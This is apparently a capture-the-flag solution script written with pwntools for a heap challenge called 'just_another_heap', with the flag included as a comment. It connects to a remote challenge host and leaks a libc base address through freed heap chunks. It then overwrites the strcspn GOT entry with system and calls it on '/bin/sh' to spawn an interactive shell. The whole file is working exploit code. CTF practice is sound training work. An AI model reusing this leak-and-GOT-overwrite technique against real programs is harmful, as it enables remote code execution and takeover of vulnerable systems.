#flag = dctf{I_h4V3_0_id3a_h0W_y0u_G0T_h3r3}
from pwn import *

exe = ELF("./just_another_heap")
libc = exe.libc 		#Ubuntu 18.04 ---> glibc2.27

#target = process([exe.path])
target = remote("dctf-chall-just-another-heap.westeurope.azurecontainer.io", 7481)

def sla(s, d):
	print target.sendline(d)

def create(idx, size, memory="whoamiT_"*3, extra_size=4):
	sla("> ", "1")
	sla("> ", str(idx))
	sla(":", "/bin/sh\x00")
	sla("> ", str(size))
	sla("> ", str(extra_size))
	sla("> ", memory)
	sla("> ", "Y")
	sla("> ", "Y")

def relive(idx):
	sla("> ", "2")
	sla("> ", str(idx))

def forget(idx):
	sla("> ", "3")
	sla("> ", str(idx))

def change(idx, memory="a"*7):
	sla("> ", "4")
	sla("> ", str(idx))
	sla("> ", "Y")
	target.sendline(memory)

create(0, 0x600)
create(1, 0x20)

forget(0)
forget(1)

create(0, 0x600, '2')
change(0)

raw_input("Press Enter please...")

relive(0)

target.recvuntil("a"*7)
libc_base = u64(target.recvline().strip().ljust(8, '\x00')) - (0x7f8234a84ca0 - 0x7f8234699000)
log.info("LIBC Base: " + hex(libc_base))

create(1, libc_base, p64(libc_base + libc.sym['system']), exe.got['strcspn'])
#gdb.attach(target)
create(2, libc_base + libc.search("/bin/sh\x00").next())

target.interactive()